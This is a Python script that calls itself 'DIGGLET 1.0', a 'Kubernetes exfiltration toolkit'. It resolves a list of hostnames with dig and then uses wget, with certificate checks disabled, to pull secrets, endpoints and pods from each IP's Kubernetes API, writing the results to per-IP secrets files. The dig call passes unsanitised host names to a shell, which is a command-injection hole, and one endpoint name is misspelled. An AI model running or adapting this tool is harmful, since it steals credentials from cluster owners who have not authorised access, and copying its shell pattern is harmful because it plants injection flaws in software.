#!/usr/bin/python3

import os
import subprocess
import shlex
import re


print(f" *************************************************************")
print(f" ******************* DIGGLET 1.0 *****************************")
print(f" *************************************************************")
print(f" ******************* By khanl4n1   ***************************")
print(f" ********* Kubernetes exfiltration toolkit *******************")
print(f" *************************************************************\n")
print(f"                     _,.---'\"\"'\"--.._ ")
print(f"                   ,\"                `-.")
print(f"                 ,'                     `.")
print(f"                /     _       ,..          `.")
print(f"               /     | |      |\"|           \\ ")
print(f"              /      | |      | |            \\ ")
print(f"             /       ._'      `_'             |")
print(f"            |                                 |")
print(f"            |        __,...._                 |")
print(f"            |      .\"        `.               |")
print(f"            |      '           )              |")
print(f"            |       `-...__,.-'               |")
print(f"            |                                 |")
print(f"            |                                 |")
print(f"         ...|                                 |")
print(f"      _,'   |                                 |")
print(f"  _,-'  ___ |                                 |.-----_")
print(f"-' ,.--`.  \\|                                 |     . \\ ")
print(f",-'     ,  |--,                               |  _,'   `- -----._")
print(f"      ,' ,'    - ----.            _,..       _|.',               \\")
print(f" ,-\"\"' .-             \\  ____   `'  _-'`  ,-'     `.              `-")
print(f" .--'\"`   ,--:`.       --    ,\"'. ,'  ,'`,_")
print(f"        _'__,' |  _,..'_    ,:______,-     --.         _.")
print(f"        -__..--' '      ` ..`L________,___ _,     _,.-'")
print(f"")


complete = ''
complete1 = []
output = []
i=1
#read the hosts file filled with FQDN list
with open("hosts.txt") as file:
    park = file.read()
    park = park.splitlines()
#Opens the Complete_DIG.txt file to write the RAW results of the dig command
    file = open("Complete_DIG.txt","w")
    for host in park:
        #prints the host selected
        file.write(f"********************************************************************************\n")
        file.write(f"{host}\n")
        file.write(f"********************************************************************************\n")
        #execute the dig command against that host
        result = subprocess.run([f"dig {host}"], shell=True, capture_output=True, text=True)
        #write the results on the file
        file.write(result.stdout)
        #uses regex pattern to find the ip addresses displayed
    pattern = "IN A [0-9_-]"
    text_file = open("Complete_DIG.txt", "r")

    for line in text_file:
        if re.search(pattern, line):
            complete = line.split(" ")[-1].replace("\n","")
            #create a list of the ip address list gathered from DIG
            output.append(complete)
    print(f"********************************************************************************")
    print (f" Here is the list of ips to test ")
    print(f"********************************************************************************")
    #display the enumerated list of ips to scan
    for element in output:
        print(f"{i} -- {element}")
        i+=1
    print(f"\n********************************************************************************")
    #attempts to retrieve secret files within kubernets and save it on a txt file as <<ip>>_secrets.txt
    for ip in output:
        response = os.popen(f"wget --no-check-certificate https://{ip}/api/v1/secrets --append-output {ip}_secrets.txt -t 1 --timeout 5").read()
        response = os.popen(f"wget --no-check-certificate https://{ip}/api/v1/namspaces --append-output {ip}_secrets.txt -t 1 --timeout 5").read()
        response = os.popen(f"wget --no-check-certificate https://{ip}/api/v1/endpoints --append-output {ip}_secrets.txt -t 1 --timeout 5 ").read()
        response = os.popen(f"wget --no-check-certificate https://{ip}/api/v1/pods --append-output {ip}_secrets.txt -t 1 --timeout 5 ").read()
    file.close()


